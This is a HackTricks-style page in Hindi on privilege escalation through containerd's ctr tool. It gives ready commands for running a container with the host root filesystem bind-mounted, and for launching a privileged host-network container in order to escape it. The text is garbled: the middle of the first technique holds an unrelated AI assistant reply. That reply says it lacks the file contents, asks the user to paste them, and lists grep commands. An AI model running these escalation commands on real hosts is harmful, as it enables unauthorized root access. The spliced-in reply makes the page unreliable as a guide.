# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

नीचे दिए गए लिंक पर जाएँ यह जानने के लिए **कि `containerd` और `ctr` कंटेनर स्टैक में कहाँ फिट होते हैं**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

यदि आप पाते हैं कि किसी होस्ट में `ctr` कमांड मौजूद है:
```bash
which ctr
/usr/bin/ctr
```
मेरे पास अभी `src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md` की सामग्री नहीं है — कृपया फ़ाइल की सामग्री पेस्ट करें या बताएं जहाँ से उठाऊँ, तब मैं उसमें मौजूद सभी इमेज़ की सूची दे दूँगा।

यदि आप खुद तुरंत जाँच करना चाहते हैं, तो नीचे कमांड्स से Markdown/HTML इमेज़ लिंक सूची कर सकते हैं:

- Markdown छवियों के पूरे सिंटैक्स के लिए:
  `grep -oP '!\[[^\]]*\]\([^)]*\)' file.md`

- केवल image URLs निकालने के लिए:
  `grep -oP '!\[[^\]]*\]\(\K[^)]+' file.md`

- HTML `<img src="...">` टैग से URLs पाने के लिए:
  `grep -oP '<img[^>]+src="\K[^"]+' file.md`

पेस्ट कर दें या कह दें किस रूप में चाहिये — मैं इमेज़ सूची दे दूँगा।
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
और फिर **उन images में से किसी एक को host root folder को उसमें mount करते हुए चलाएँ**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

एक privileged container चलाकर उससे escape करें.\
आप एक privileged container को निम्नलिखित तरीके से चला सकते हैं:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
फिर आप निम्नलिखित पृष्ठ में बताई गई कुछ तकनीकों का उपयोग कर सकते हैं ताकि **privileged capabilities का दुरुपयोग करके इससे बाहर निकल सकें**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
